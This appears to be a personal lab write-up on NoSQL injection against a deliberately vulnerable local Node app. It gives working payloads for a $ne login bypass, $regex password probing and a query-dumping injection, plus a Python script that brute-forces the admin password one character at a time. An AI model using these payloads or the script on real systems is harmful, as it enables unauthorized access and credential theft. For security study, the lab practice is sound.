# Definition
Something to do.
# Installing and Preparing Lab
I will use the [vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app) GitHub project that contains the docker machine to practice this vulnerability.
```shell
git clone https://github.com/Charlie-belmer/vulnerable-node-app
cd vulnerable-node-app
docker-compose up -d
```
___
After that, we should see something like this.
![[Pasted image 20230729173507.png]]
___
Now, we must make click on **Populate / Reset DB** to reset and create users to practice this lab.
![[Pasted image 20230729173637.png]]
___
# Attacking
## Contextualizing
So far, we don't know nothing about this web. Let's try out to logg in as *admin* user.
![[Pasted image 20230729180129.png]]
___
Now, we are going to use **BurpSuite** to know what is happening behind the *Login* button.
![[Pasted image 20230729180439.png]]
We can see that the web uses the **POST** method to send data along with **Json** as Content-Type.
___
So, what should we do now?
Well, we could start by using a *Payload* from [Payloads-all-the-things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection).
This payload says us that the password is *not equal* to **admin**.
```json
{
	"username":"admin",
	"password": {
		"$ne":"admin"
	}
}
```
![[Pasted image 20230729181026.png]]
And great, we did logg in as the *admin* user.
___
## NoSQLI Using REGEX
Now, in this lab, logging in as *admin* doesn't serve us of nothing, but will be there any way to find out the password of this *admin* user?
YES!, the solution is use **Regex**s that you can see them at [Payloads-all-the-things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection).
This payload uses a *regex* that matches if the password starts with `a`, that is the function of `^` operand.
```json
{
	"username":"admin",
	"password": {
		"$regex":"^a"
	}
}
```
![[Pasted image 20230729182436.png]]
So, according to the answer, you could know that the password doesn't start with `a`.
___
Then, you could iterate *all characters and numbers* until you find the character that the password starts with.
And the first character is `2`.
![[Pasted image 20230729182827.png]]
___
### Automatization With Python
We are going to automate the character search using a Python script.
But, frist, it would be useful for us to know the *password size*. So, how do we find that?
Let's use another payload from [Payloads-all-the-things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) to find out the *password size*.
```json
{
	"username":"admin",
	"password": {
		"$regex":".{30}"
	}
}
```
![[Pasted image 20230729184004.png]]
___
Now, let's vary by decreasing `30` until the answer is correct.
Then, the *password size* is `24`.
![[Pasted image 20230729184230.png]]
___
With the *password size* found we can continue with our **Python** script.
```Python
#!/usr/bin/python3
from pwn import *
import requests, time, sys, signal, string

# function to manage CTRL+c
def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# principal function to crack
def makeNoSQLI():
    # pwn bars
    p1 = log.progress("Brute force")
    p1.status("Staring brute force process")

    time.sleep(2)

    p2 = log.progress("Password cracked")

    password_cracked = ""
    # password size
    for index in range(0, 24):
        for character in characters:
            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password_cracked, character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}
            r = requests.post(target_url, headers=headers, data=post_data)

            # validate character matched
            if ("Logged in as user" in r.text):
                password_cracked += character
                p2.status(password_cracked)
                break

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

# global variables
target_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

if __name__ == "__main__":
    makeNoSQLI()
```
![[Pasted image 20230729190928.png]]
Now, let's use that *cracked password*.
![[Pasted image 20230729191004.png]]
___
## NoSQLI Queries Attack
If you remember that in SQL Injections you could use `' or 1=1-- -` to dump database information.
So, there is a similar way to achieve that in NoSQL Injections by using `' || '1'=='1` from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection).
![[Pasted image 20230729191530.png]]
Great, you were able to *dump* database information.
Then, with that **username list** you could use the above *Python* script to crack their passwords.
___